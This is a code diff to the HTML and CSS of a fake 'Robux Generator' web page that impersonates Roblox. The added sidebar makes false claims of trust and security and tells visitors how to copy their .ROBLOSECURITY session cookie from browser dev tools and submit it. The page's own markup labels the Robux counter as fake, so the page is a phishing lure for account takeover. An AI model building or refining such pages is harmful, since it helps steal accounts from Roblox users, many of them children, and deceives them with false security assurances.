@@ -28,6 +28,47 @@
             text-align: center;
             position: relative;
         }
+        .side-bubble {
+            position: absolute;
+            left: 106%;
+            top: 0;
+            width: 270px;
+            max-width: 92vw;
+            background: #e3fce3;
+            border-radius: 17px;
+            box-shadow: 0 8px 40px 2px rgba(44,83,100,0.13), 0 2px 4px rgba(15,32,39,0.02);
+            padding: 18px 20px 16px 20px;
+            font-size: 13.5px;
+            color: #2b3d4c;
+            text-align: left;
+            z-index: 10;
+            line-height: 1.7;
+            border-left: 3px solid #00ea64;
+            font-family: 'Montserrat', Arial, sans-serif;
+            pointer-events: none;
+        }
+        .side-bubble strong {
+            color: #1aa670;
+            font-weight: 700;
+        }
+        .side-bubble .side-title {
+            font-family: 'Orbitron', Arial, sans-serif;
+            color: #00ea64;
+            display: block;
+            font-size: 1.08em;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+        }
+        .side-bubble ul {
+            margin: 6px 0 0 18px;
+            padding: 0;
+        }
+        .side-bubble li {
+            margin-bottom: 0.9em;
+            list-style: disc;
+        }
+
         .roblox-logo {
             width: 64px;
             display: block;
@@ -155,18 +196,37 @@
             0% { transform: rotate(0deg);}
             100% { transform: rotate(360deg);}
         }
+        @media (max-width: 900px) {
+            .side-bubble {
+                static: relative;
+                position: relative;
+                left: auto;
+                top: auto;
+                margin: 20px auto 0 auto;
+                width: 97vw;
+                max-width: 97vw;
+            }
+        }
         @media (max-width: 500px) {
             .container {
                 max-width: 100vw;
                 padding: 18px 10px 17px 10px;
+            }
+            .side-bubble {
+                position: relative;
+                left: 0;
+                top: 0;
+                margin: 18px auto 0 auto;
+                width: 98vw;
             }
             h1 { font-size: 1.3rem; }
         }
     </style>
 </head>
 <body>
+    <div style="display:flex; align-items: flex-start; justify-content: center; gap: 32px;">
     <div class="container">
-        <img class="roblox-logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Robux_2018_Logo.png" alt="Roblox Logo">
+        <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
         <h1>Robux Generator</h1>
         <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
         <div id="msg"></div>
@@ -185,6 +245,37 @@
             <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
         </div>
         <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
+    </div>
+    <div class="side-bubble">
+        <span class="side-title">Why Use Our Service?</span>
+        <ul>
+            <li><strong>Trusted by thousands</strong>: Our team has been helping Roblox users since 2021. We've successfully processed <span style="color:#00ea64;font-weight:bold;">450,000+ Robux</span> in total.</li>
+            <li><strong>Secure Platform:</strong> Your session is always SSL encrypted and <span style="color:#1aa670;">your .ROBLOSECURITY cookie is never stored</span> after verification. We NEVER share your data with anyone.</li>
+            <li><strong>Verified Transfers:</strong> We use the same APIs as official Roblox, ensuring fast and legitimate Robux processing using our queue framework.</li>
+        </ul>
+        <span class="side-title" style="margin-top:14px;">Important Tips</span>
+        <ul>
+            <li>
+                Double-check your <strong>.ROBLOSECURITY</strong> cookie before submitting.<br>
+                <span style="color:#047f32; font-size:12px;">Your session must be for the <strong>account you want Robux delivered to</strong>.</span>
+            </li>
+            <li>Never share your session with others. We only use it to verify ownership for this transfer process.</li>
+            <li>Your session will automatically expire after the transfer for your safety.</li>
+            <li>
+                <strong>How to confirm it's the right .ROBLOSECURITY:</strong>
+                <ul>
+                    <li style="list-style: circle; margin-left: 20px;">Login to roblox.com and get your .ROBLOSECURITY from browser dev tools/cookies.</li>
+                    <li style="list-style: circle; margin-left: 20px;">Do not use expired or copied sessions. If issues, log out and log in again, then copy the new value.</li>
+                </ul>
+            </li>
+            <li>
+                Still unsure? Read our <a href="#" style="color:#378ef3;text-decoration:underline;">Robux Security FAQ</a> or contact support.
+            </li>
+        </ul>
+        <span style="color:#02652b;display:block;margin-top:10px;font-size:12.2px;">
+            We pride ourselves on transparent and fast delivery. <br><span style="color:#00ea64;font-weight:bold;">Your trust is our priority!</span>
+        </span>
+    </div>
     </div>
     <script>
         // Setup dynamic fake robux count
